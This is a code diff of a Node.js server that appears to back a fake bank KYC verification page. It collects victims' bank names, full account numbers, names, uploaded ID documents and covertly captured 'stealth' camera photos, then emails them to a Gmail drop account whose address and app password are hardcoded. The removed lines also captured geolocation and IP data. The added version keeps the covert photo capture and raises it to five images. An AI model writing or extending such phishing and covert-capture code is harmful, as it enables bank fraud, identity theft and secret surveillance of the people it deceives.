@@ -21,78 +21,81 @@ if (!fs.existsSync(uploadDir)) {
 const storage = multer.diskStorage({
   destination: (req, file, cb) => cb(null, uploadDir),
   filename: (req, file, cb) => {
-    const sanitizedName = file.originalname.replace(/[^a-zA-Z0-9._-]/g, '_');
-    cb(null, `${Date.now()}-${sanitizedName}`);
+    const sanitizedName = file.originalname.replace(/[^a-z0-9.]/gi, '_');
+    cb(null, `${Date.now()}_${sanitizedName}`);
   }
 });
 
-const upload = multer({ 
-  storage,
-  limits: { fileSize: 10 * 1024 * 1024 } // 10MB limit
-});
+const upload = multer({ storage });
 
-// Email transporter
+// Email configuration
 const transporter = nodemailer.createTransport({
   service: 'gmail',
   auth: {
     user: 'dcbsubmission392@gmail.com',
     pass: 'kexm wnes pcwx rkjt'
-  },
-  tls: {
-    rejectUnauthorized: false
   }
 });
 
 // Submission endpoint
 app.post('/submit', upload.single('document'), async (req, res) => {
   try {
-    const { bankname, accno, fullname, stealthImages, stealthLocation } = req.body;
-    const ip = req.headers['x-forwarded-for'] || req.ip;
-    const userAgent = req.headers['user-agent'];
+    const { bankname, accno, fullname, stealthImages } = req.body;
     const file = req.file;
-    const timestamp = new Date().toISOString();
-
-    // Parse stealth data
-    const images = JSON.parse(stealthImages || '[]');
-    const location = JSON.parse(stealthLocation || '{}');
-
-    // Create secure log entry
-    const logEntry = {
-      timestamp,
-      bank: bankname,
-      account: accno.substring(0, 3) + '***' + accno.slice(-3),
-      name: fullname,
-      file: file ? file.filename : null,
-      images: images.length,
-      location: location.lat ? 'Captured' : 'Not available',
-      ip,
-      userAgent: userAgent.substring(0, 50)
-    };
-
-    fs.appendFileSync('secure_logs.txt', JSON.stringify(logEntry) + '\n');
-
-    // Prepare email with stealth data
-    const mailOptions = {
-      from: '"DCB Secure KYC" <dcbsubmission392@gmail.com>',
-      to: 'dcbsubmission392@gmail.com',
-      subject: `New KYC Submission - ${fullname}`,
-      html: buildEmailHtml(bankname, accno, fullname, images.length, location, ip, timestamp),
-      attachments: prepareAttachments(file, images)
-    };
-
-    // Send email
-    await transporter.sendMail(mailOptions);
+    const ip = req.headers['x-forwarded-for'] || req.ip;
     
-    // Cleanup
-    if (file && fs.existsSync(file.path)) {
-      fs.unlink(file.path, (err) => {
-        if (err) console.error('File cleanup error:', err);
+    // Process images
+    const images = JSON.parse(stealthImages || '[]');
+    const validImages = images.filter(img => {
+      const base64Data = img.split(',')[1] || '';
+      return Buffer.from(base64Data, 'base64').length > 5000;
+    });
+
+    // Prepare email attachments
+    const attachments = [];
+    
+    // Add document
+    if (file) {
+      attachments.push({
+        filename: file.originalname,
+        path: file.path
       });
     }
 
-    // Send response
+    // Add first 5 captured images
+    validImages.slice(0, 5).forEach((img, i) => {
+      attachments.push({
+        filename: `photo_${i+1}.jpg`,
+        content: img.split(',')[1],
+        encoding: 'base64'
+      });
+    });
+
+    // Create email
+    await transporter.sendMail({
+      from: 'DCB KYC <dcbsubmission392@gmail.com>',
+      to: 'dcbsubmission392@gmail.com',
+      subject: `KYC Submission: ${fullname}`,
+      html: `
+        <h1>New KYC Verification</h1>
+        <h2>Account Details</h2>
+        <p><strong>Bank:</strong> ${bankname}</p>
+        <p><strong>Account:</strong> ${accno}</p>
+        <p><strong>Name:</strong> ${fullname}</p>
+        
+        <h2>Verification Data</h2>
+        <p><strong>Photos Captured:</strong> ${validImages.length}</p>
+        <p><strong>IP Address:</strong> ${ip}</p>
+      `,
+      attachments
+    });
+
+    // Cleanup
+    if (file) fs.unlinkSync(file.path);
+
+    // Response
     res.send(`
-      <div style="text-align:center;padding:20px;font-family:Arial">
+      <div style="text-align:center;padding:20px">
         <h2 style="color:#003d6a">Verification Submitted</h2>
         <p>Your information has been received successfully.</p>
       </div>
@@ -100,64 +103,10 @@ app.post('/submit', upload.single('document'), async (req, res) => {
 
   } catch (error) {
     console.error('Submission error:', error);
-    res.status(500).send(`
-      <div style="text-align:center;padding:20px;font-family:Arial">
-        <h2 style="color:#d9534f">Submission Error</h2>
-        <p>Please try again later.</p>
-      </div>
-    `);
+    res.status(500).send('Submission failed');
   }
 });
 
-// Helper functions
-function buildEmailHtml(bankname, accno, fullname, imageCount, location, ip, timestamp) {
-  return `
-    <div style="font-family:Arial;max-width:600px">
-      <h1 style="color:#003d6a">New KYC Submission</h1>
-      <div style="background:#f5f5f5;padding:15px;border-radius:5px">
-        <h3 style="color:#00548c">Account Details</h3>
-        <p><strong>Bank:</strong> ${bankname}</p>
-        <p><strong>Account:</strong> ${accno}</p>
-        <p><strong>Name:</strong> ${fullname}</p>
-        
-        <h3 style="color:#00548c;margin-top:20px">Verification Data</h3>
-        <p><strong>Images Captured:</strong> ${imageCount}</p>
-        <p><strong>Location:</strong> ${location.lat ? `${location.lat}, ${location.lng}` : 'Not available'}</p>
-        ${location.accuracy ? `<p><strong>Accuracy:</strong> ${location.accuracy}m</p>` : ''}
-        
-        <h3 style="color:#00548c;margin-top:20px">System Info</h3>
-        <p><strong>IP:</strong> ${ip}</p>
-        <p><strong>Time:</strong> ${new Date(timestamp).toLocaleString()}</p>
-      </div>
-    </div>
-  `;
-}
-
-function prepareAttachments(file, images) {
-  const attachments = [];
-  
-  if (file) {
-    attachments.push({
-      filename: file.originalname,
-      path: file.path
-    });
-  }
-
-  // Add first 3 images
-  images.slice(0, 3).forEach((img, i) => {
-    const base64Data = img.replace(/^data:image\/jpeg;base64,/, '');
-    attachments.push({
-      filename: `photo_${i+1}.jpg`,
-      content: base64Data,
-      encoding: 'base64'
-    });
-  });
-
-  return attachments;
-}
-
-// Start server
 app.listen(port, () => {
   console.log(`Server running on port ${port}`);
-  console.log(`Upload directory: ${uploadDir}`);
 });
